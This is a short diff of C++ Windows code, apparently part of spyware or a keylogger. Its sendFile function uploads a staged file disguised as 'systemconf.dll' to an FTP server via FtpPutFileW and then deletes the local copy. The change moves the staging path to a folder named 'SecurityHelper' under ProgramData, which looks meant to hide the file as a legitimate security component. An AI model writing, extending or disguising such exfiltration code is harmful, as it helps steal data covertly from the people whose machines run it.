@@ -1,3 +1,4 @@
+        
 #include <direct.h>
 #include <wininet.h>
 #include <fstream>
@@ -53,10 +54,10 @@ bool sendFile(std::string identification, bool firstRun){
         for (int a=0;a<=dateWithFullPathLength;a++){
             file[a]=dateWithFullPath[a];
         }
-    char localFile[] = "C:\\Firefox\\systemconf.dll";
+    char localFile[] = "C:\\ProgramData\\SecurityHelper\\systemconf.dll";
         if(FtpPutFileW(hFtp,s2ws(localFile).c_str(),s2ws(file).c_str(),INTERNET_FLAG_TRANSFER_BINARY,0) == 1){
             //cout << "\n3) Everything is perfect...\n";
-            remove( "C:\\Firefox\\systemconf.dll" );
+            remove( "C:\\ProgramData\\SecurityHelper\\systemconf.dll" );
 
         }
 //        else
@@ -67,4 +68,3 @@ bool sendFile(std::string identification, bool firstRun){
 
     return 0;
 }
-
